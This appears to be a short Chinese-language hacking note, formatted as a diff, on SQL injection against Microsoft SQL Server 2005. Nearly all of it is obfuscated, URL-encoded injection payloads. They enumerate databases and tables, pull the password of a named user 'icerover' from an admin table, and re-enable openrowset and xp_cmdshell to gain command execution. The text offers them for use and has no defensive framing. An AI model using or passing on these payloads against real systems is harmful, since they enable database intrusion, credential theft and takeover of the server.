@@ -1,0 +1,35 @@
+
+
+
+[Copy to clipboard]CODE:
+/**/and/**/(select/**/top/**/1/**/isnull(cast([name]/**/as/**/nvarchar(500)),char(32))%2bchar(124)/**/from/**/[master].[dbo].[sysdatabases]/**/where/**/dbid/**/in/**/(select/**/top/**/1/**/dbid/**/from/**/[master].[dbo].[sysdatabases]/**/order/**/by/**/dbid/**/desc))%3d0--
+
+爆表语句,somedb部份是所要列的数据库，红色数字1累加
+
+
+[Copy to clipboard]CODE:
+/**/and/**/(select/**/top/**/1/**/cast(name/**/as/**/varchar(200))/**/from/**/(select/**/top/**/1/**/name/**/from/**/somedb.sys.all_objects/**/where/**/type%3dchar(85)/**/order/**/by/**/name)/**/t/**/order/**/by/**/name/**/desc)%3d0--
+
+爆字段语句，爆表admin里user='icerover'的密码段
+
+
+[Copy to clipboard]CODE:
+**/And/**/(Select/**/Top/**/1/**/isNull(cast([password]/**/as/**/varchar(2000)),char(32))%2bchar(124)/**/From/**/(Select/**/Top/**/1/**/[password]/**/From/**/[somedb]..[admin]/**/Where/**/user='icerover'/**/Order/**/by/**/[password])/**/T/**/Order/**/by/**/[password]Desc)%3d0--
+
+mssql2005默认没有开xp_cmdshell的，openrowset也不能用
+如果是sa权限，可以这样来开启
+开启openrowset
+
+
+[Copy to clipboard]CODE:
+/**/sp_configure/**/'show/**/advanced/**/options',/**/1;RECONFIGURE;--
+/**/sp_configure/**/'Ad/**/Hoc/**/Distributed/**/Queries',/**/1;RECONFIGURE;--
+
+开启xp_cmdshell
+
+
+[Copy to clipboard]CODE:
+EXEC/**/sp_configure/**/'Ad/**/Hoc/**/Distributed/**/Queries',1;RECONFIGURE;--
+EXEC/**/sp_configure/**/'show/**/advanced/**/options',1;RECONFIGURE;EXEC/**/sp_configure/**/'xp_cmdshell',1;RECONFIGURE;--
+
+ok,over~~晚安
